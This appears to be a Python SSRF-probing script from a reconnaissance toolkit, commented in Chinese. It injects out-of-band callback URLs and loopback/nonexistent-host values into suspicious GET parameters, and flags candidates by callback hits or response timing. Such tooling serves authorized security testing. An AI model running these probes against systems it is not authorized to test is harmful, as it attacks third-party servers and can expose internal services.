# -*- coding: utf-8 -*-
"""W11 · SSRF 参数探测 ssrf_triage.py

输入：--run-dir + --endpoints（api_confirmed.jsonl 或类似）或 --url。
两路探测：
  ① OOB token 注入（需要 oob_listener 在跑：--oob http://<vps或本机>:8899/<prefix>）
  ② 时间盲：127.0.0.1:<port> vs 不存在域名，响应时间桶 <500ms / 0.5-5s / >5s
输出 ssrf_candidates.jsonl：verdict = oob_callback_hit | timing_candidate | noise

安全约束：delay≥3s、每host≤5端点、只测 GET、POST 表单参数只做静态候选不自动发。
"""
from __future__ import annotations

import argparse
import json
import re
import sys
import time
from datetime import datetime, timezone, timedelta
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(ROOT))
from oob_listener import HITS as OOB_HITS  # noqa: E402  (本地命中文件)

SSRF_PARAMS = set(
    (ROOT / "wordlists" / "ssrf_params.txt").read_text(encoding="utf-8").split()
)


def now_iso():
    return datetime.now(timezone(timedelta(hours=8))).isoformat(timespec="seconds")


def load_urls_with_params(endpoints_file: Path, extra_url: str | None) -> list[dict]:
    """收集含可疑参数名的 GET 端点。"""
    out = []
    if endpoints_file and endpoints_file.is_file():
        for ln in endpoints_file.read_text(encoding="utf-8", errors="replace").splitlines():
            ln = ln.strip()
            if not ln:
                continue
            try:
                e = json.loads(ln)
            except json.JSONDecodeError:
                continue
            url = e.get("url") or e.get("final_url")
            if url and str(url).startswith(("http://", "https://")):
                out.append(str(url))
    if extra_url:
        out.append(extra_url)
    seen = set()
    candidates = []
    for u in out:
        if u in seen:
            continue
        seen.add(u)
        p = urlparse(u)
        qs = parse_qs(p.query, keep_blank_values=True)
        ssrf_keys = [k for k in qs if k.lower() in SSRF_PARAMS]
        if ssrf_keys:
            candidates.append({"url": u, "params": ssrf_keys})
    return candidates


def mutate_param(url: str, param: str, value: str) -> str:
    p = urlparse(url)
    qs = parse_qs(p.query, keep_blank_values=True)
    for k in qs:
        if k.lower() == param.lower():
            qs[k] = [value]
    return urlunparse(p._replace(query=urlencode(qs, doseq=True)))


def fetch(url, timeout=12, delay=3.0):
    if not HAS_REQUESTS:
        raise RuntimeError("无 requests：请用 .venv 运行")
    time.sleep(delay)
    return requests.get(url, timeout=timeout, allow_redirects=False)


def check_oob_hit(token: str, since_ts: str) -> bool:
    if not OOB_HITS.is_file():
        return False
    for ln in OOB_HITS.read_text(encoding="utf-8", errors="replace").splitlines():
        if ln.strip():
            try:
                r = json.loads(ln)
            except json.JSONDecodeError:
                continue
            if r.get("token") == token and r.get("ts", "") >= since_ts[:19]:
                return True
    return False


def main():
    ap = argparse.ArgumentParser(description="SSRF 参数探测（W11）")
    ap.add_argument("--run-dir", required=True)
    ap.add_argument("--endpoints", default=None, help="api_confirmed.jsonl 或同类端点文件")
    ap.add_argument("--url", default=None, help="单个目标 URL（带查询参数）")
    ap.add_argument("--oob", default=None, help="OOB 回调地址，如 http://127.0.0.1:8899/<prefix>")
    ap.add_argument("--delay", type=float, default=3.0)
    ap.add_argument("--max-per-host", type=int, default=5)
    ap.add_argument("--force", action="store_true")
    a = ap.parse_args()

    run_dir = Path(a.run_dir)
    out_jsonl = run_dir / "ssrf_candidates.jsonl"
    if out_jsonl.exists() and not a.force:
        print(f"[=] 已存在 {out_jsonl}（--force 重跑）")
        return

    import secrets
    cands = load_urls_with_params(Path(a.endpoints) if a.endpoints else None, a.url)
    print(f"[*] 含 SSRF 可疑参数的端点 {len(cands)}；OOB={'开' if a.oob else '关'}；delay={a.delay}s")

    results = []
    per_host = {}
    for c in cands:
        url = c["url"]
        host = urlparse(url).hostname or ""
        if per_host.get(host, 0) >= a.max_per_host:
            continue
        for param in c["params"][:2]:
            per_host[host] = per_host.get(host, 0) + 1
            rec = {"endpoint": url, "param": param, "host": host, "ts": now_iso()}

            # ① OOB 注入
            if a.oob:
                token = secrets.token_hex(6)
                since = now_iso()
                try:
                    r = fetch(mutate_param(url, param, f"{a.oob}/{token}"), delay=a.delay)
                    time.sleep(1.0)
                    if check_oob_hit(token, since):
                        rec["verdict"] = "oob_callback_hit"
                        results.append(rec)
                        print(f"  [oob_callback_hit] {param} @ {url[:90]}")
                        continue
                    else:
                        rec["oob_status"] = r.status_code
                except Exception as e:
                    rec["oob_error"] = str(e)[:120]

            # ② 时间盲：本机端口 vs 不存在域名
            try:
                t0 = time.monotonic()
                r1 = fetch(mutate_param(url, param, "http://127.0.0.1:1/"), delay=a.delay)
                t1 = time.monotonic() - t0
                t2_0 = time.monotonic()
                r2 = fetch(mutate_param(url, param, "http://nonexistent-abc-xyz.invalid/"), delay=a.delay)
                t2 = time.monotonic() - t2_0
                # 慢端点响应时间桶
                diff = t1 - t2
                if diff > 1.5 or t1 > 5.0:
                    rec["verdict"] = "timing_candidate"
                    rec["timing"] = {"local": round(t1, 2), "nxdomain": round(t2, 2)}
                elif abs(diff) <= 0.5:
                    rec["verdict"] = "noise"
                    rec["timing"] = {"local": round(t1, 2), "nxdomain": round(t2, 2)}
                else:
                    rec["verdict"] = "noise"
            except Exception as e:
                rec["verdict"] = "noise"
                rec["error"] = str(e)[:120]

            results.append(rec)
            print(f"  [{rec['verdict']}] {param} @ {url[:90]}")

    with out_jsonl.open("w", encoding="utf-8") as f:
        for r in results:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")
    n_hit = sum(1 for r in results if r.get("verdict") in ("oob_callback_hit", "timing_candidate"))
    print(f"[+] {out_jsonl}（{len(results)} 探测，{n_hit} 候选）")


if __name__ == "__main__":
    main()
